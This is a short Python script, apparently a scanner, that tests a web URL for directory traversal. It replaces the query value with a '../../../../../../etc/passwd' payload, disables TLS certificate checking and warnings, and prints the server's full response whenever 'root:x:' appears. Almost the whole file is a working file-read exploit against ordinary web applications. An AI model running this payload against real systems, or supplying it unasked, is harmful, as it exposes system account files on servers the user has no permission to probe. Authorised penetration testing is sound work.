import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def directoryTraversal(url):
    """
    Scans a given URL for directory traversal vulnerability.
    
    Parameters:
    url (str): The target URL to scan.
    """
    try:
        session = requests.Session()
        deger = url.find("=")
        if (deger == -1):
            print("[-] Invalid URL format. No '=' found in the URL.")
            return
        
        payload_url = url[:deger + 1] + "../../../../../../etc/passwd"
        response = session.get(payload_url, verify=False)
        
        if response.status_code == 200:
            content = response.content.decode('utf-8', 'ignore') if isinstance(response.content, bytes) else response.content
            if "root:x:" in content:
                print("[+] Directory traversal possible, payload: ../../../../../../etc/passwd")
                print("Response: ", content)
            else:
                print("[-] Directory traversal isn't possible, payload: ../../../../../../etc/passwd")
                print("Response: ", content)
        else:
            print(f"[-] Failed to get a valid response. Status code: {response.status_code}")
    except requests.RequestException as e:
        print(f"[-] Error occurred during the request: {e}")

# Example usage:
# directoryTraversal("http://example.com/page?id=123")
